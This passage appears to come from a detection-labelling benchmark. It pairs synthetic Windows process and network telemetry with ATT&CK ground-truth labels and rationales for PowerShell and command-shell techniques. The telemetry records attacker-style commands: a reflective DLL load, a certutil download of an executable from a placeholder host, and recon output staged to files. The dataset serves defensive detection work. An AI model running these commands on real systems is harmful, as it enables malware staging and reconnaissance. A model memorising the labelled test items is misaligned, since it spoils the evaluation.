    "ParentProcessGuid": "{f25ca6cc-088f-08f1-2c2b-d43026ff83b2}",
    "ParentProcessId": 7520,
    "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
    "ProcessId": 7524,
    "User": "mchen",
    "UtcTime": "2026-06-01T18:16:29Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_F/single",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_017d3b75",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process-creation record contains a PowerShell reflective-loading invocation; it does not establish that the assembly loaded successfully.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_bd54db39"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_017d3b75",
    "event_record_id": 152033472428265,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Add-Type -TypeDefinition 'public class Loader {public static void Run() {System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes(@\"C:\\Users\\Public\\elm_pine_oak_06c78b\\cache.dll\"));}}'; [Loader]::Run()\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{8917a898-8afa-7b9e-ccef-72f69ff3a8c2}",
      "LogonId": "0x1d65",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{f25ca6cc-088f-08f1-2c2b-d43026ff83b2}",
      "ParentProcessId": 7520,
      "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
      "ProcessId": 7524,
      "User": "mchen",
      "UtcTime": "2026-06-01T18:16:29Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:16:29Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_23f14a5f",
    "event_record_id": 153107846415767,
    "fields": {
      "Computer": "FILESVR01",
      "DestinationIp": "203.0.113.10",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
      "ProcessId": 7524,
      "Protocol": "tcp",
      "SourceIp": "203.0.113.20",
      "SourcePort": 57509,
      "User": "mchen",
      "UtcTime": "2026-06-01T18:16:32Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:16:32Z",
    "windows_event_id": 3
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Add-Type -TypeDefinition 'public class Loader {public static void Run() {System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes(@\"C:\\Users\\Public\\elm_pine_oak_06c78b\\cache.dll\"));}}'; [Loader]::Run()\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{8917a898-8afa-7b9e-ccef-72f69ff3a8c2}",
    "LogonId": "0x1d65",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{f25ca6cc-088f-08f1-2c2b-d43026ff83b2}",
    "ParentProcessId": 7520,
    "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
    "ProcessId": 7524,
    "User": "mchen",
    "UtcTime": "2026-06-01T18:16:29Z"
  },
  {
    "Computer": "FILESVR01",
    "DestinationIp": "203.0.113.10",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
    "ProcessId": 7524,
    "Protocol": "tcp",
    "SourceIp": "203.0.113.20",
    "SourcePort": 57509,
    "User": "mchen",
    "UtcTime": "2026-06-01T18:16:32Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_F/contextual",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_017d3b75",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ProcessGuid"
        ]
      },
      {
        "event_id": "evt_23f14a5f",
        "fields": [
          "Computer",
          "Image",
          "ProcessGuid"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The command line establishes the reflective-loading invocation; later same-process network activity corroborates process continuity, not successful assembly loading.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_06839a35"
}
```

## pair_3b4d4d14
Family: TF_T1059_003_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_44955180",
    "event_record_id": 249325708949138,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all && hostname > C:\\ProgramData\\maple_alder_willow_3b4d4d\\inventory.txt",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0xe8a4",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0xe8a0",
      "SubjectLogonId": "0xe8a5",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-03-05T13:11:16Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-05T13:11:16Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all && hostname > C:\\ProgramData\\maple_alder_willow_3b4d4d\\inventory.txt",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0xe8a4",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0xe8a0",
    "SubjectLogonId": "0xe8a5",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-03-05T13:11:16Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_A/single",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_44955180",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The Security process-creation record shows cmd.exe invoked with a chained command and output redirection.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_f1c1622b"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_44955180",
    "event_record_id": 249325708949138,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all && hostname > C:\\ProgramData\\maple_alder_willow_3b4d4d\\inventory.txt",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0xe8a4",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0xe8a0",
      "SubjectLogonId": "0xe8a5",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-03-05T13:11:16Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-05T13:11:16Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_0ef66a6d",
    "event_record_id": 123085255141732,
    "fields": {
      "CommandLine": "whoami /all",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0xe8a8",
      "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ProcessId": "0xe8a4",
      "SubjectLogonId": "0xe8a5",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-03-05T13:11:19Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-03-05T13:11:19Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c whoami /all && hostname > C:\\ProgramData\\maple_alder_willow_3b4d4d\\inventory.txt",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0xe8a4",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0xe8a0",
    "SubjectLogonId": "0xe8a5",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-03-05T13:11:16Z"
  },
  {
    "CommandLine": "whoami /all",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0xe8a8",
    "NewProcessName": "C:\\Windows\\System32\\whoami.exe",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ProcessId": "0xe8a4",
    "SubjectLogonId": "0xe8a5",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-03-05T13:11:19Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_A/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_44955180",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessId",
          "NewProcessName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_0ef66a6d",
        "fields": [
          "Computer",
          "ProcessId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The child process is linked to the command-shell parent through creator/new-process identifiers, preserving the command-shell evidence.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_b4f78ba0"
}
```

## pair_0a8b5342
Family: TF_T1059_003_B; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_9cdf0975",
    "event_record_id": 17898643868167,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f https://files.example.invalid/birch_fir_aspen_0a8b53/package.exe C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
      "Computer": "EXCH01",
      "EventID": 4688,
      "NewProcessId": "0x4eb8",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\services.exe",
      "ProcessId": "0x4eb4",
      "SubjectLogonId": "0x4eb9",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-02-10T03:05:39Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-10T03:05:39Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f https://files.example.invalid/birch_fir_aspen_0a8b53/package.exe C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
    "Computer": "EXCH01",
    "EventID": 4688,
    "NewProcessId": "0x4eb8",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\services.exe",
    "ProcessId": "0x4eb4",
    "SubjectLogonId": "0x4eb9",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-02-10T03:05:39Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_9cdf0975",
        "fields": [
          "NewProcessName",
          "ParentProcessName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "A cmd.exe process with a services.exe parent is observable, but the single view does not establish whether the action is administrative or adversarial.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_83007aae"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "EXCH01",
    "event_id": "evt_9cdf0975",
    "event_record_id": 17898643868167,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f https://files.example.invalid/birch_fir_aspen_0a8b53/package.exe C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
      "Computer": "EXCH01",
      "EventID": 4688,
      "NewProcessId": "0x4eb8",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\services.exe",
      "ProcessId": "0x4eb4",
      "SubjectLogonId": "0x4eb9",
      "SubjectUserName": "jsmith",
      "TargetUserName": "jsmith",
      "TimeCreated": "2026-02-10T03:05:39Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-10T03:05:39Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_353f465e",
    "event_record_id": 85961587798625,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "ProcessGuid": "{4e2e7de7-b261-7380-39e9-dd4717554554}",
      "ProcessId": 20156,
      "TargetFilename": "C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
      "User": "jsmith",
      "UtcTime": "2026-02-10T03:05:42Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-10T03:05:42Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c certutil -urlcache -split -f https://files.example.invalid/birch_fir_aspen_0a8b53/package.exe C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
    "Computer": "EXCH01",
    "EventID": 4688,
    "NewProcessId": "0x4eb8",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\services.exe",
    "ProcessId": "0x4eb4",
    "SubjectLogonId": "0x4eb9",
    "SubjectUserName": "jsmith",
    "TargetUserName": "jsmith",
    "TimeCreated": "2026-02-10T03:05:39Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "ProcessGuid": "{4e2e7de7-b261-7380-39e9-dd4717554554}",
    "ProcessId": 20156,
    "TargetFilename": "C:\\ProgramData\\birch_fir_aspen_0a8b53\\agent.exe",
    "User": "jsmith",
    "UtcTime": "2026-02-10T03:05:42Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_B/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_9cdf0975",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "SubjectUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_353f465e",
        "fields": [
          "Computer",
          "TargetFilename",
          "User",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The services.exe parent, cmd.exe command line containing certutil staging syntax, and related file-creation record provide contextual evidence; the records do not establish command completion.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_5f82c1ad"
}
```

## pair_4348f67b
Family: TF_T1059_003_C; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_ae9fe618",
    "event_record_id": 28375019329907,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c \"C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat\"",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0x11650",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x11654",
      "SubjectLogonId": "0x11651",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-01-28T08:06:06Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-28T08:06:06Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c \"C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat\"",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0x11650",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x11654",
    "SubjectLogonId": "0x11651",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-01-28T08:06:06Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_C/single",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_ae9fe618",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process-creation record identifies cmd.exe invoking a batch script with shell-specific delayed expansion.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_5c7f0852"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION02",
    "event_id": "evt_d8d1a8cf",
    "event_record_id": 36349482106106,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 11,
      "Image": "C:\\Windows\\explorer.exe",
      "ProcessGuid": "{210f45f7-fcfa-c508-29ff-2d474cf44530}",
      "ProcessId": 71252,
      "TargetFilename": "C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat",
      "User": "wlee",
      "UtcTime": "2026-01-28T08:06:03Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-28T08:06:03Z",
    "windows_event_id": 11
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_ae9fe618",
    "event_record_id": 28375019329907,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c \"C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat\"",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0x11650",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x11654",
      "SubjectLogonId": "0x11651",
      "SubjectUserName": "wlee",
      "TargetUserName": "wlee",
      "TimeCreated": "2026-01-28T08:06:06Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-28T08:06:06Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION02",
    "EventID": 11,
    "Image": "C:\\Windows\\explorer.exe",
    "ProcessGuid": "{210f45f7-fcfa-c508-29ff-2d474cf44530}",
    "ProcessId": 71252,
    "TargetFilename": "C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat",
    "User": "wlee",
    "UtcTime": "2026-01-28T08:06:03Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c \"C:\\Users\\Public\\elm_willow_yew_4348f6\\stage.bat\"",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0x11650",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x11654",
    "SubjectLogonId": "0x11651",
    "SubjectUserName": "wlee",
    "TargetUserName": "wlee",
    "TimeCreated": "2026-01-28T08:06:06Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_C/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_ae9fe618",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_d8d1a8cf",
        "fields": [
          "Computer",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "A related batch-file creation event shares the command-shell process identity; this supports the recorded script invocation but does not establish successful completion.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_dee6769d"
}
```

## pair_10992bfc
Family: TF_T1059_003_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_2a10255e",
    "event_record_id": 62874570537179,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c call \"C:\\Users\\Public\\maple_willow_elm_10992b\\stage.bat\"",
      "Computer": "APPSVR01",
      "EventID": 4688,
      "NewProcessId": "0xc1c0",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\mshta.exe",
      "ProcessId": "0xc1bc",
      "SubjectLogonId": "0xc1c1",
      "SubjectUserName": "agarcia",
      "TargetUserName": "agarcia",
      "TimeCreated": "2026-04-14T18:01:39Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-14T18:01:39Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c call \"C:\\Users\\Public\\maple_willow_elm_10992b\\stage.bat\"",
    "Computer": "APPSVR01",
    "EventID": 4688,
    "NewProcessId": "0xc1c0",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\mshta.exe",
    "ProcessId": "0xc1bc",
    "SubjectLogonId": "0xc1c1",
    "SubjectUserName": "agarcia",
    "TargetUserName": "agarcia",
    "TimeCreated": "2026-04-14T18:01:39Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_DEV/single",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_2a10255e",
        "fields": [
          "CommandLine",
          "NewProcessName",
          "ParentProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only command shell delayed expansion launched by mshta has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_186881d9"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_2a10255e",
    "event_record_id": 62874570537179,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c call \"C:\\Users\\Public\\maple_willow_elm_10992b\\stage.bat\"",
      "Computer": "APPSVR01",
      "EventID": 4688,
      "NewProcessId": "0xc1c0",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\mshta.exe",
      "ProcessId": "0xc1bc",
      "SubjectLogonId": "0xc1c1",
      "SubjectUserName": "agarcia",
      "TargetUserName": "agarcia",
      "TimeCreated": "2026-04-14T18:01:39Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-14T18:01:39Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "APPSVR01",
    "event_id": "evt_863deb82",
    "event_record_id": 103531701165925,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c echo maple_willow_elm_10992b",
      "Computer": "APPSVR01",
      "EventID": 4688,
      "NewProcessId": "0xc1c4",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ProcessId": "0xc1c0",
      "SubjectLogonId": "0xc1c1",
      "SubjectUserName": "agarcia",
      "TargetUserName": "agarcia",
      "TimeCreated": "2026-04-14T18:01:42Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-14T18:01:42Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /v:on /c call \"C:\\Users\\Public\\maple_willow_elm_10992b\\stage.bat\"",
    "Computer": "APPSVR01",
    "EventID": 4688,
    "NewProcessId": "0xc1c0",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\mshta.exe",
    "ProcessId": "0xc1bc",
    "SubjectLogonId": "0xc1c1",
    "SubjectUserName": "agarcia",
    "TargetUserName": "agarcia",
    "TimeCreated": "2026-04-14T18:01:39Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c echo maple_willow_elm_10992b",
    "Computer": "APPSVR01",
    "EventID": 4688,
    "NewProcessId": "0xc1c4",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ProcessId": "0xc1c0",
    "SubjectLogonId": "0xc1c1",
    "SubjectUserName": "agarcia",
    "TargetUserName": "agarcia",
    "TimeCreated": "2026-04-14T18:01:42Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_DEV/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_2a10255e",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName"
        ]
      },
      {
        "event_id": "evt_863deb82",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only command shell delayed expansion launched by mshta behavior through a related telemetry event.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_db731519"
}
```

## pair_3a4cce27
Family: TF_T1059_003_E; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_99cae7a4",
    "event_record_id": 229956539862867,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c tasklist | findstr /i service > C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
      "Computer": "WORKSTATION01",
      "EventID": 4688,
      "NewProcessId": "0x4e54",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x4e50",
      "SubjectLogonId": "0x4e55",
      "SubjectUserName": "admin.svc",
      "TargetUserName": "admin.svc",
      "TimeCreated": "2026-01-01T11:51:54Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-01T11:51:54Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c tasklist | findstr /i service > C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
    "Computer": "WORKSTATION01",
    "EventID": 4688,
    "NewProcessId": "0x4e54",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x4e50",
    "SubjectLogonId": "0x4e55",
    "SubjectUserName": "admin.svc",
    "TargetUserName": "admin.svc",
    "TimeCreated": "2026-01-01T11:51:54Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_E/single",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_99cae7a4",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The anchor visibly records Windows Command Shell piping and filtering output into a staged file.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_5dc520cc"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
